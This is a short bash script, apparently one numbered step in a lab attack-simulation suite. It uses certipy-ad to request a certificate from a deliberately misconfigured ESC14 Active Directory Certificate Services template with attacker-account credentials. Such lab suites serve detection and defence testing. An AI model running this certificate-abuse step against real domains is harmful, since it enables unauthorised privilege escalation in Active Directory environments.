#!/bin/bash
# CONFIGURED—CA cadre-CA running, ESC14 explicit mapping template published
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "061" "ESC14 — Certificate template with weak/alternate subject"

require_tool certipy-ad

log "Requesting certificate with CADRE-ESC14 template"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-ESC14 -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC14 — certificate request"
